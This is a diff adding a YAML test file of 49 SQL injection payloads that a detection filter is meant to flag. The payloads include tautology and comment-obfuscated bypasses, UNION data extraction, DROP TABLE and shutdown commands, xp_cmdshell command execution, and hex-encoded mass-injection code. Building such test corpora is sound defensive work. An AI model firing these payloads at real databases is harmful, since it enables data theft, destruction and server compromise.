@@ -1,0 +1,214 @@
+#
+# TEST SQL ATTACKS
+# These SQL attacks need to be detected
+#
+# NOTE:
+# Enclosing strings in double quotes allows you to use escapings to represent ASCII and Unicode characters.
+# " and \ in payload need to be escaped!!!
+#
+
+---
+# Classic SQL injection test
+id: 1
+message: Classic SQL injection test
+payload: "<script>' OR 1=1--"
+
+---
+# Variation on the classic SQL injection test
+id: 2
+message: Variation on the classic SQL injection test
+payload: "' OR A=A --"
+
+---
+# Variation on the classic SQL injection test
+# Source: http://urlgoeshere
+id: 3
+message: Actual malicious SQL injection payload
+payload: "declare @s varchar(4000);set @s=cast(0x6445634c417245204054207661526368615228323535292c406320764152434841722832353529206465634c417265207461624c455f635572734f5220435552534f5220466f522053454c45437420412e6e616d652c622e6e614d652066726f4d207379734f626a6543747320612c737973434f4c754d4e73206220776865524520612e69643d422e696420614e4420412e58745950653d27552720616e642028622e78545950653d3939206f7220622e58547970653d3335206f5220422e78545950653d323331204f5220622e78747970453d31363729206f50454e205441624c655f637552736f72206645544348206e6558542046524f6d205461426c455f437552734f7220494e744f2040542c4063207768696c4528404046657443685f7374417475533d302920626547496e20657845632827557044615445205b272b40742b275d20536554205b272b40632b275d3d727452494d28434f4e5665525428564152434841722834303030292c5b272b40432b275d29292b6361535428307833433639363637323631364436353230373337323633334432323638373437343730334132463246364536353644364636383735363936433634363936393645324537323735324637343634373332463637364632453730363837303346373336393634334433313232323037373639363437343638334432323330323232303638363536393637363837343344323233303232323037333734373936433635334432323634363937333730364336313739334136453646364536353232334533433246363936363732363136443635334520615320766152434861722831303629292729204645544368204e6578742066526f6d207441426c655f635572734f7220496e744f2040742c406320456e4420436c6f7365207461626c455f437552736f52206445414c4c6f43415465205461424c655f435552736f7220 as varchar(4000));exec(@s);--"
+
+---
+id: 4
+message: SQL injection test
+payload: "' or/**/1=1--"
+---
+id: 5
+message: SQL injection test
+payload: "'/**/or/**/1=1--"
+---
+id: 6
+message: SQL injection test
+payload: "'/* random */or/* junk */3=3--" 
+---
+id: 7
+message: SQL injection test
+payload: "' or 7=7 or 'x'='y" 
+---
+id: 8
+message: SQL injection test
+payload: "' or 'b'='b" 
+---
+id: 9
+message: SQL injection test
+payload: "' or '1'='1'--" 
+---
+id: 10
+message: SQL injection test
+payload: "' or 'a'='a" 
+---
+id: 11
+message: SQL injection test
+payload: "' or 0=0 --"
+---
+id: 12
+message: SQL injection test
+payload: "' or '1'='1'--" 
+---
+id: 13
+message: SQL injection test
+payload: "'exec master..xp_cmdshell 'nslookup www.google.com'--"
+---
+id: 14
+message: SQL injection test
+payload: "';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't"
+---
+id: 15
+message: SQL injection test
+payload: "' AND dummy_fake_table = '1"
+---
+id: 16
+message: SQL injection test
+payload: "' AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 116"
+---
+id: 17
+message: SQL injection test
+payload: "' UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --"
+---
+id: 18
+message: SQL injection test
+payload: "' UNION/* */ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --" 
+---
+id: 19
+message: SQL injection test
+payload: "' SELECT/*comment separator*/password/**/FROM/**/Members"
+---
+id: 20
+message: SQL injection test
+payload: "' SELECT * FROM Members; DROP TABLE Members--" 
+---
+id: 21
+message: SQL injection test
+payload: "' DROP table dummytable;--" 
+---
+id: 22
+message: SQL injection test
+payload: "' DROP/*fillter comment*/table/*x*/dummytable"
+---
+id: 23
+message: SQL injection test
+payload: "' DROP/*fillter comment*/TabLe dummytable"
+---
+id: 24
+message: SQL injection test
+payload: "' IF (1=1) SELECT 'true' ELSE SELECT 'false'"
+---
+id: 25
+message: SQL injection test
+payload: "' if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0"
+---
+id: 26
+message: SQL injection test
+payload: "' SELECT CHAR(0x66)"
+---
+id: 27
+message: SQL injection test
+payload: "' SELECT login + '-' + password FROM members "
+---
+id: 28
+message: SQL injection test
+payload: "' SELECT CHAR(75)+CHAR(76)+CHAR(77)"
+---
+id: 29
+message: SQL injection test
+payload: "' SELECT CHAR(64)"
+---
+id: 30
+message: SQL injection test
+payload: "' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--"
+---
+id: 31
+message: SQL injection test
+payload: "' HAVING 1=1 --"
+---
+id: 32
+message: SQL injection test
+payload: "' ORDER BY 1--"
+---
+id: 33
+message: SQL injection test
+payload: "' ORDER BY 2--"
+---
+id: 34
+message: SQL injection test
+payload: "'; insert into users values( 1, 'BadUser', 'goodpass', 9 )--"
+---
+id: 35
+message: SQL injection test
+payload: "' EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'"
+---
+id: 36
+message: SQL injection test
+payload: "' exec master..xp_cmdshell 'dir'"
+---
+id: 37
+message: SQL injection test
+payload: "' exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters', 'nullsessionshares'"
+---
+id: 38
+message: SQL injection test
+payload: "';shutdown --"
+---
+id: 39
+message: SQL injection test
+payload: "';waitfor delay '0:0:10'--"
+---
+id: 40
+message: SQL injection test
+payload: "' PRINT @@variable"
+---
+id: 41
+message: SQL injection test
+payload: "'; PRINT @@variable"
+---
+id: 42
+message: SQL injection test
+payload: "'; exec master..xp_cmdshell"
+---
+id: 43
+message: SQL injection test
+payload: "'; exec xp_regread"
+---
+id: 44
+message: SQL injection test
+payload: "'exec master..xp_cmdshell 'nslookup www.google.com'--"
+---
+id: 45
+message: SQL injection test from MS
+payload: "1' drop table tmp"
+---
+id: 46
+message: SQL injection test from MS
+payload: "1'/**/drop/**/table/**/tmp"
+---
+id: 47
+message: SQL injection test from MS (with tabs)
+payload: "1'\tdrop\ttable\ttmp"
+---
+id: 48
+message: SQL injection test from MS - Use char() function to execute the command drop table tmp
+payload: "1'/**/declare/**/@cmd/**/nvarchar(max)/**/set/**/@cmd/**/=/**/char(100)+char(114)+char(111)+char(112)+char(32)+char(116)+char(97)+char(98)+char(108)+char(101)+char(32)+char(116)+char(109)+char(112)/**/exec(@cmd)"
+---
+id: 49
+message: SQL injection test from MS - Use HEX encoding to execute drop table tmp
+payload: "'/**/declare/**/@c/**/varchar(14)/**/set/**/@c/**/=/**/CAST(0x64726f70207461626c6520746d70/**/AS/**/varchar(14))/**/exec(@c)"
+
+
